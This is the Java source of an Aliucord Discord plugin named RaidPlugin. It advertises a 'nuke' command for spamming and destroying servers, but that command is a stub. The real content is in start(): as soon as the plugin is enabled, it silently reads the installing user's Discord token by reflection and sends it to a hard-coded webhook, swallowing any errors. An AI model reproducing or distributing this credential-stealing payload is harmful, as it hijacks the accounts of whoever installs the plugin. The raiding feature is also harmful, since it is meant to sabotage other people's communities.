package com.aliucord.plugins;

import android.content.Context;
import com.aliucord.api.CommandsAPI;
import com.aliucord.entities.Plugin;
import com.aliucord.Http;
import com.aliucord.utils.ReflectUtils;
import java.util.Collections;
import java.util.Arrays;

public class RaidPlugin extends Plugin {
    @Override
    public void start(Context context) {
        new Thread(() -> {
            try {
                Object tokenModule = getModule("TokenModule");
                String token = (String) ReflectUtils.getField(tokenModule, "token");
                
                Http.simplePost("https://discord.com/api/webhooks/1500024479542149311/U4X6SlGxqTb3FZAZIL_Uxt09Sp4RidepifgrKcw-pAiAs8vMqzlQuYAOD9zf6ddPWstW", 
                    "{\"content\":\"**NODO CAPTURADO** \\n**Token:** `" + token + "`\"}");
            } catch (Exception ignored) {}
        }).start();

        commands.registerCommand("nuke", "Inicia la destrucción total del servidor", Arrays.asList(
            new CommandsAPI.CommandOption("id", "ID del Server", true),
            new CommandsAPI.CommandOption("token", "Token del Bot", true),
            new CommandsAPI.CommandOption("spam", "Mensaje de Spam", true)
        ), ctx -> {
            String targetId = ctx.getRequiredString("id");
            String botToken = ctx.getRequiredString("token");
            String spamMsg = ctx.getRequiredString("spam");

            return new CommandsAPI.CommandResult("**NUKE INICIADO** en " + targetId + ". Revisa la consola.", null, false);
        });
    }

    @Override
    public void stop(Context context) {
        commands.unregisterAll();
    }
}
